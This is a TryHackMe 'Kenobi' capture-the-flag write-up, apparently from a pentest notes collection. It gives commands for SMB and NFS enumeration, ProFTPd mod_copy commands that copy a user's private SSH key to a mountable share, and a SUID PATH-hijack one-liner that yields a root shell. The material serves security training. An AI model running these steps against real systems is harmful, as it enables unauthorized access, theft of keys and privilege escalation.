# TryHackMe - Kenobi

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Easy |
| OS | Linux |
| Key services | SMB, NFS, FTP/ProFTPd, SSH |

## Attack Chain Overview

```text
Recon -> anonymous SMB note -> NFS export -> ProFTPd mod_copy
  -> copy Kenobi SSH key into /var/tmp
  -> mount NFS and recover id_rsa
  -> SSH as kenobi
  -> SUID /usr/bin/menu PATH hijack
  -> root shell
```

## Summary

Kenobi is a classic Linux service-enumeration chain. SMB exposed a readable anonymous share, NFS exposed `/var`, and ProFTPd `mod_copy` let the attacker copy Kenobi's private SSH key into `/var/tmp`. Mounting the NFS export made the copied key retrievable, leading to SSH access as `kenobi`.

Privilege escalation came from a SUID binary (`/usr/bin/menu`) that called helper tools without absolute paths. A malicious `curl` placed earlier in `PATH` yielded a root shell.

## Reconnaissance

Tools: [nmap](../../../tools/recon/nmap.md), [smbmap](../../../tools/recon/smbmap.md), [smbclient](../../../tools/recon/smbclient.md).

```bash
# What it does: perform a full port scan and service enumeration.
# Why here: identify classic Linux services like SMB, NFS, and ProFTPd that form the multi-stage attack surface.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
nmap -sVC -p22,80,445,111,2049,37261,40289,42185,54513 $TARGET -oN service
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $TARGET
smbmap -H $TARGET -u '' -p ''
# What it does: connect to the anonymous SMB share.
# Why here: retrieve the log.txt file which contains sensitive information about the system configuration and ProFTPd.
smbclient //$TARGET/anonymous
get log.txt
```

## Initial Access

Full technique: [ProFTPd mod_copy SSH key loot](../../../exploits/network-services/proftpd-mod-copy-rsa.md). Related: [NFS mounted file loot](../../../exploits/network-services/nfs-mounted-file-loot.md).

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

```bash
mkdir /mnt/kenobiNFS
# What it does: mount the target's /var NFS export.
# Why here: access the /var/tmp directory where the SSH key was copied using the ProFTPd mod_copy vulnerability.
mount $TARGET:/var /mnt/kenobiNFS
# What it does: copy the recovered SSH key from the NFS mount to the local machine.
# Why here: prepare the private key for authentication to the target system via SSH.
cp /mnt/kenobiNFS/tmp/id_rsa .
# What it does: set strict permissions on the recovered private key.
# Why here: comply with SSH security requirements to enable the key for authentication.
chmod 600 id_rsa
# What it does: log in as 'kenobi' via SSH using the recovered private key.
# Why here: obtain a user-level shell on the target to begin local privilege escalation.
ssh -i id_rsa kenobi@$TARGET
```

## Privilege Escalation

Full technique: [SUID PATH hijack](../../../exploits/privesc-linux/suid-path-hijack.md).

```bash
# What it does: search the filesystem for SUID binaries.
# Why here: identify /usr/bin/menu, a custom SUID binary that is vulnerable to PATH hijacking.
find / -perm -u=s -type f 2>/dev/null
# What it does: analyze the /usr/bin/menu binary for unqualified command calls.
# Why here: confirm that the binary calls 'curl' without an absolute path, enabling a PATH hijack attack.
strings /usr/bin/menu
# What it does: navigate to the /tmp directory.
# Why here: prepare to create the malicious helper binary in a world-writable location for the PATH hijack.
cd /tmp
# What it does: create a malicious 'curl' script in /tmp.
# Why here: provide a payload that will be executed as root when the SUID binary calls 'curl' via the hijacked PATH.
echo /bin/sh > curl
# What it does: make the malicious curl helper executable.
# Why here: ensure the SUID binary can execute the payload when it triggers the hijacked 'curl' call.
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## Key Takeaways

- When FTP and NFS overlap, server-side copy can become file exfiltration.
- Anonymous SMB may provide only the clue, not the foothold itself.
- For SUID binaries, `strings` can reveal unqualified helper calls.

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [smbmap](../../../tools/recon/smbmap.md)
- [smbclient](../../../tools/recon/smbclient.md)
- [ProFTPd mod_copy SSH key loot](../../../exploits/network-services/proftpd-mod-copy-rsa.md)
- [NFS mounted file loot](../../../exploits/network-services/nfs-mounted-file-loot.md)
- [SUID PATH hijack](../../../exploits/privesc-linux/suid-path-hijack.md)
- [Linux enumeration](../../../exploits/enumeration/linux-enumeration.md)
